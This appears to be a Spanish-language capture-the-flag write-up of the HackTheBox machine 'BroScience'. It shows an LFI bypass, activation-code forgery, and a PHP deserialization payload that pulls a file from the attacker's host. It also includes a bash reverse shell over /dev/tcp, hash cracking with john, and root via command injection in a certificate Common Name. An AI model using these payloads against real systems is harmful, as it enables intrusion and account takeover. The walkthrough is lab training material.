---
layout: post
title: "Write Up BroScience. "
subtitle: "Starting-Point"
category: Blog
tags: [Medium,Chunin,Linux,HTB,Write-Up-Machine,eWPT,eJPTv2] 
image:
  path: /assets/img/broscience/Captura%20de%20pantalla%20(298).png
---

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconnaissance


### nmap


```bash
nmap -p- --open --min-rate 5000 -n -vvv -Pn 10.10.11.195 -oA allports
```


![list](/assets/img/broscience/AWESOMW-2023-01-12-00-22-25.png){:.lead width="800" height="100" loading="lazy"}

***

### Services and Versions


```bash
nmap -p22,80,443 -sV -sC 10.10.11.195 -oN target
```


![list](/assets/img/broscience/AWESOMW-2023-01-12-00-25-34.png){:.lead width="800" height="100" loading="lazy"}


***

## Vulnerability Analysis


### HTTP TCP-80


Uso de Investigacion web, Google Hacking,Google Dorks y recopilación de información gracias a servicios de terceros.e ispeccionamos la web, ademas de las tecnologias de la ip ataves de la terminal o via  web esto lo hacemos con wapalizzer o whatweb.


![list](/assets/img/broscience/AWESOMW-2023-01-12-00-28-14.png){:.lead width="800" height="100" loading="lazy"}


Whatweb nos  esta aplicando un reirerct al dominio `broscience.htb` por lo que lo ingresamos al `/etc/hosts`.


Tambien podemos fuzzear los directorioso con nmap antes de usar otros fuzzers mas completos para ver que informacion nos entrega.


![list](/assets/img/broscience/AWESOMW-2023-01-12-00-30-57.png){:.lead width="800" height="100" loading="lazy"}


Inspeccionamos la web a ver que nos encontramos, cave que estamos en https es edecir en el pueto 443 por o que deberemos aceptar los certificados autofirmados.


![list](/assets/img/broscience/AWESOMW-2023-01-12-00-31-20.png){:.lead width="800" height="100" loading="lazy"}


![list](/assets/img/broscience/AWESOMW-2023-01-12-00-34-25.png){:.lead width="800" height="100" loading="lazy"}


Con burpsuite vamos a tratar de explotar alguna vulnerabilidades entre ellas la de local file inclusion pero la web lo detecta como atacke y no nos lo permite haci que vamos a tratar de bypassear.


![list](/assets/img/broscience/AWESOMW-2023-01-12-00-34-25.png){:.lead width="800" height="100" loading="lazy"}


Para bypasear debemos urlencodear dos veces.


![list](/assets/img/broscience/AWESOMW-2023-01-12-00-50-45.png){:.lead width="800" height="100" loading="lazy"}


En la pagina hay un formulario para registrarnos pero, no podemos activarlo para eso vamos a utilizar burpsuite porque al momento que nos registramos se crea con la hora y fecha de eso nos aprovecharemos.


![list](/assets/img/broscience/AWESOMW-2023-01-12-01-23-56.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
La fecha es martes doce de enero del 2023.


Por lo que vamos a crear un script que se encargue de buscar los recursos sincronizado con la fecha de creacion del usuario asi como se van a mostrar los datos La fecha es martes doce de enero del 2023..


```shell
<?php
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
srand(strtotime("Thu, 12 Jan 2023 06:23:52 GMT"));
$activation_code = "";
for ($i = 0; $i < 32; $i++) {
    $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
}
echo $activation_code;
?>
```


{:.note}
Editar `srand` por vuestros datos esto nos dara un codigo `TgwM7M253W5gRUJLvLeqUItOoyTialHL`.


![list](/assets/img/broscience/AWESOMW-2023-01-12-00-59-48.png){:.lead width="800" height="100" loading="lazy"}


![list](/assets/img/broscience/AWESOMW-2023-01-12-01-29-34.png){:.lead width="800" height="100" loading="lazy"}


Para activarlo, debemos interceptar con bursuite y pegar el codigo en el campo `GET/activated.php?code=TgwM7M253W5gRUJLvLeqUItOoyTialHL` y recargar.


![list](/assets/img/broscience/Captura%20de%20pantalla%20(319).png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Podemos hace lo mismo con otras rutas en este caso obtenemos credenciales de la base de datos `broscience` , el usuario es `dbuser` y la password es `RangeOfMotion%777`.


Tambien encontramos las `clases Avatar` y `AvatarInterface` que guardan archivos localmente y si  modificamos la variable `tmp` e `imgPath` para que apunte a nuestro equipo, para finalmente serializar la data, quedaria un script como el siguiente.


```bash
<?php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = "http://10.10.16.14/pwned.php";
    public $imgPath = "./pwned.php";

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$payload = base64_encode(serialize(new AvatarInterface));
echo $payload;
?>
```


Al ejecutar el php nos dará una data serializada que usaremos como cookie ademas debemos pero para eso tambien crear un archivo .php para otorgarnos un reverse-shell y montarnos un servidor con python sudo `python3 -m http.server 80`.


```bash
<?php
    system("bash -c 'bash -i >& /dev/tcp/10.10.16.14/443 0>&1'")
?>
```


Contodo esto nos dara la cookie que podemos poner en nuestro buscador tenemos iniciada sesión cambiamos nuestra cookie por el payload generado.


![list](/assets/img/broscience/Captura%20de%20pantalla%20(320).png){:.lead width="800" height="100" loading="lazy"}
En este puto otra ves de bemos tener un servidor activo y tambien debemos estar a la escucha en el puerto 44e con netcat.


Aunque somos www-data aun no podemos ver la flag del usuario de bajos privilegios asique debemos hacer user-pivoting para convertirnos ene otro asi que podemos trarar con la base de datos con psql usando las credenciales.


```bash
psql -h localhost -d broscience -U dbuser -P RangeOfMotion%777
```

{:.note}
Encontramos algunos hashes que gusrdaremos en un archivo que vamos atratr de crackear con john.


Podemos intentar romper los hashes pero tenemos que agregar el salt al inicio de cada linea.


```bash
sed 's/^/NaCl/' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt > newrockyou.txt
```



```bash
john -w:newrockyou.txt hashes --format=Raw-MD5
```


{:.note}
Obtenemos tres ccredenciales `NaCliluvhorsesandgym (bill)`,`NaClAaronthehottest (dmytro)` y `NaCl2applesplus2apples (michael)`.


Si usamos las credenciales de bill quitandole el salt nos podemos conectar por SSH.


```bash
sshpass -p 'iluvhorsesandgym' ssh bill@10.10.11.195
```


{:.note}
Ya podemos buscar la flag de bajos privileguios en el escritorip del usuario `bill`. 


***

## Explotation and Escalation Privileges


Siempre es bueno ejecutar `LimEnum` Y `pspy` para monitorizar y ver los posibles vectores para escalar de privilegios, ademas hasta que se ejecute los anteriores podemos buscar los permisos con el comado find o tareas crond o tareas que esperen ejecucion y root ejecuta un script con un certificado como argumento.


![list](/assets/img/broscience/AWESOMW-2023-01-12-01-08-59.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Inspeccionando el script podemos generar uno dejando todos los campos vacios pero en el Common Name ejecutar un comando.


```bash
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.key -out broscience.crt -days 1
```


Podemos dale enter a todo los campos execto el` Common Name (e.g. server FQDN or YOUR name) []:` aqui es donce le metemos el comando para que la bash tenga permisos SUID con `$(chmod u+s /bin/bash)`.


{:.note}
Lo ultimo hacer bash -p y buscar la flag de superusuario en el escritorio de root.

***

```shell
🎉 Felicitaciones ya has comprometido BroScience de HackTheBox 🎉
```
{:.centered}
***

Back to [Certification eJPTv2](2023-07-03-Road-to-eJPTv2.md){:.heading.flip-title}
{:.read-more}

***

Back to [Certification OSEP](2022-09-12-Beginner-Track.md){:.heading.flip-title}
{:.read-more}